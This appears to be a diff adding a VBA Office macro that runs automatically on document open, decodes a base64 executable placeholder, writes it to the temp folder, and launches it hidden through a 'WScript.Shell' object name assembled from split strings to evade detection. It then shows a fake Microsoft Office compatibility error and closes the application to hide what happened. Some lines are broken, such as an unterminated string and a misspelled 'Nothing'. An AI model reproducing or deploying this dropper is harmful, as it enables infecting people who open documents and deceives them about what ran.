@@ -1,0 +1,58 @@
+Sub Auto_Open()
+    Dim shell As String
+    shell = "####Insert Base64 Encoded EXE####"
+
+    Dim place
+    place = Environ("temp")
+    
+    Dim out As String
+    Dim data() As Byte
+    data = System.Convert.FromBase64String(shell)
+    out = System.Text.AsciiEncoding.Ascii.GetString(data)
+    
+    Dim myFile As String
+    myFile = place & "\test.exe
+    
+    Const UseBinaryStreamType = 1
+    Const SaveWillCreateOrOverwrite = 2
+
+    Dim streamOutput: Set streamOutput = CreateObject("ADODB.Stream")
+    Dim xmlDoc: Set xmlDoc = CreateObject("Microsoft.XMLDOM")
+    Dim xmlElem: Set xmlElem = xmlDoc.createElement("tmp")
+    
+    xmlElem.dataType = "bin.base64"
+    xmlElem.Text = shell
+    streamOutput.Open
+    streamOutput.Type = UseBinaryStreamType
+    streamOutput.Write = xmlElem.nodeTypedValue
+    streamOutput.SaveToFile myFile, SaveWillCreateOrOverwrite
+    
+    Set streamOutput = Nothing
+    Set xmlDoc = Nothing
+    Set xmlElem = Nothin
+    
+    Dim UTrCSyfcE
+    UTrCSyfcE = "S" & "h" & "e" & "l" & "l" 
+    Dim jKSHHEJY
+    jKSHHEJY = "W" & "S" & "c" & "r" & "i" & "p" & "t" 
+    Dim JdVvcpha
+    JdVvcpha = jKSHHEJY & "." & UTrCSyfcE
+    
+    Dim xaibF
+    Set xaibF = VBA.CreateObject(JdVvcpha)
+    Dim waitOnReturn As Boolean: waitOnReturn = False
+    Dim windowStyle As Integer: windowStyle = 0
+    
+    Dim PBgdCRAyjlldZBo
+    PBgdCRAyjlldZBo = myFile
+    xaibF.Run PBgdCRAyjlldZBo , windowStyle, waitOnReturn
+    
+    Dim title As String
+    title = "Microsoft Office (Compatibility Mode)"
+    Dim msg As String
+    Dim intResponse As Integer
+    msg = "This application appears to have been made with an older version of the Microsoft Office product suite. Please have the author save this document to a newer and supported format. [Error Code: -219]"
+    intResponse = MsgBox(msg, 16, title)
+    Application.Quit
+    
+End Sub
